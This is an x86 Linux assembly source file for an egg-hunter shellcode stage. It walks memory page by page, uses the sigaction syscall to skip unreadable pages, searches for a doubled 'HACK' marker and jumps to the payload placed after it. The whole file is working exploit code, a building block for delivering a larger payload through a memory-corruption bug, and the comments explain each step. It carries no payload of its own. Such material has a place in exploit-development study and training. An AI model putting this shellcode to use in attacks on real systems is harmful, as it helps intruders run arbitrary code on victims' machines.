global _start

egg equ 0x4b434148  ; "HACK" in ASCII (little endian)

section .text

_start:
    ; Align ECX to page boundary (page size = 4096). We don't care about the initial value of ECX (it'll wrap around).
    or cx, 0xfff
continue:
    inc ecx
    
    ; Call 'sigaction' to check read access of memory.
    ; int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact): syscall 0x43
    ;     sigaction(whatever, memory_address, whatever)
    push 0x43
    pop eax
    int 0x80
    
    ; Check if EFAULT (= 14 -> -14 = 0xf2) is returned. If that's the case, move on to the next page.
    cmp al, 0xf2
    je _start
    
    ; Compare the current four bytes of memory to the egg. If it doesn't match, move on to the next address.
    mov eax, egg
    mov edi, ecx
    scasd
    jne continue
    
    ; Compare the next four bytes of memory to the egg. If it doesn't match, move on to the next address.
    scasd
    jne continue
    
    ; We found the egg! Jump to the payload following it.
    jmp edi

